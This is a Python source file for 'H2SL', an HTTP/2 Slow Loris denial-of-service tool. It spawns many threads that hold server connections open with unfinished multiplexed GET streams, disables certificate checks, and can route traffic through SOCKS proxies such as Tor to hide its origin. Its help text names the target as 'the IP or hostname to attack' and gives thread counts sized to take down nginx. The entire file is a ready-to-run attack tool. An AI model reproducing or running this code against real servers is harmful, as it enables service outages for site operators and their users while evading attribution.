#!/usr/bin/env python3
import socket
import socks
import ssl
import certifi

import h2.connection
import h2.events
import time
import threading
import argparse
import os
import re

# Print iterations progress


def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=-1, fill='█', printEnd="\r"):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
    """
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    if length <= 0:
        length = os.get_terminal_size().columns - len(prefix) - len(suffix) - len(percent) - 10
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print(f'\r\033[2K{prefix} |{bar}| {percent}% {suffix}', end=printEnd)
    # Print New Line on Complete
    if iteration == total:
        print()


def worker(server_name: str, server_port: int, server_path: str, server_requests: int, event: threading.Event):
    socket.setdefaulttimeout(15)
    ctx = ssl._create_unverified_context(cafile=certifi.where())
    ctx.set_alpn_protocols(['h2'])
    while True:
        try:
            # generic socket and ssl configuration

            # open a socket to the server and initiate TLS/SSL
            with socket.create_connection((server_name, server_port)) as s:
                while True:
                    s = ctx.wrap_socket(s, server_hostname=server_name)
                    c = h2.connection.H2Connection()
                    c.initiate_connection()
                    s.sendall(c.data_to_send())

                    headers = [
                        (':method', 'GET'),
                        (':path', server_path),
                        (':authority', server_name),
                        (':scheme', 'https'),
                    ]
                    for i in range(0, server_requests):
                        c.send_headers(i*2+1, headers, end_stream=False)
                    s.sendall(c.data_to_send())
                    event.set()
                    time.sleep(50)
        except:
            pass

def check_http2(host: str, port:int) -> bool:
    try:
        ctx = ssl._create_unverified_context()
        ctx.set_alpn_protocols(['h2', 'spdy/3', 'http/1.1'])

        conn = ctx.wrap_socket(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
        conn.connect((host, port))

        pp = conn.selected_alpn_protocol()

        if pp == "h2":
            return True
        else:
            return False
    except Exception as e:
        print(e)
    return False


def validate_hostname(hostname: str) -> (str | argparse.ArgumentTypeError):
    try:
        socket.gethostbyname(hostname)
        return hostname
    except:
        raise argparse.ArgumentTypeError("invalid host!")



def validate_port(port: int) -> (int | argparse.ArgumentTypeError):
    try:
        port = int(port)
        if port > 0 and port <= 65535:
            return port
    except:
        pass
    
    raise argparse.ArgumentTypeError("invalid port!")
    

def validate_proxy(proxy_str: str) -> (dict | argparse.ArgumentTypeError):
    proxy_str = proxy_str.lower()
    reg = r'^socks(4|5):\/\/([a-z0-9.-]+):(\d+)$'
    m = re.search(reg, proxy_str)
    if m:
        proxy = {
            "version":m.group(1),
            "host":validate_hostname(m.group(2)),
            "port":validate_port(m.group(3))
        }
        
        if proxy["version"] == "5":
            socks.set_default_proxy(socks.SOCKS5, proxy["host"], proxy["port"])
        else:
            socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
        socket.socket = socks.socksocket
        return proxy
    raise argparse.ArgumentTypeError("invalid proxy!")

def main():
    VERSION = 1.0
    parser = argparse.ArgumentParser(description=f"H2SL - HTTP2 Slow Loris v{VERSION} by ShotokanZH")
    parser.add_argument("server_name", type=validate_hostname, help="the IP or hostname to attack")
    parser.add_argument("--port", "-p", type=validate_port, default=443, help="the HTTPS port where an HTTP2 server is listening (Default: 443)")
    parser.add_argument("--threads", "-t", type=int, default=1, help="number of threads, as a 'thumb rule' 100 is usually enough for a standard nginx. (Default: 1)")
    parser.add_argument("--requests", "-r", type=int, default=129, help="requests per HTTP2 connection, multiplexed, default should be the nginx max (Default: 129)")
    parser.add_argument("--filepath", "-f", type=str, default='/', help="path to a big file, >1MB preferred (Default: /)")
    parser.add_argument("--wait", "-w", type=int, default=1, help="waiting time to start a new thread if no ack is received, in seconds (Default: 1)")
    parser.add_argument("--proxy", "-x", type=validate_proxy, default=None, help="uses the selected socks4/5 proxy. Example: socks4://127.0.0.1:9050")
    args = parser.parse_args()

    print(parser.description,"\n")

    if args.proxy:
        print("Using socks proxy:",args.proxy,"\n")
    else:
        print("Direct mode! (no proxy)")

    print("Checking http2..", end=" ")
    if not check_http2(args.server_name, args.port):
        print(f"ERROR\n\tHost {args.server_name}:{args.port} does not support http2!")
        exit(1)
    print("OK!\n")

    print("Starting threads..")
    for i in range(0, args.threads):
        event = threading.Event()
        printProgressBar(i+1, args.threads, prefix=f"Starting thread", suffix=f"- {i+1}/{args.threads}")
        t = threading.Thread(
            target=worker,
            kwargs={
                "server_name": args.server_name,
                "server_port": args.port,
                "server_path": args.filepath,
                "server_requests": args.requests,
                "event": event
            }
        )
        t.daemon = True
        t.start()
        event.wait(args.wait)
    print("\nH2SL Online! (^C to quit)")
    while True:
        time.sleep(0.05)


if __name__ == "__main__":
    main()
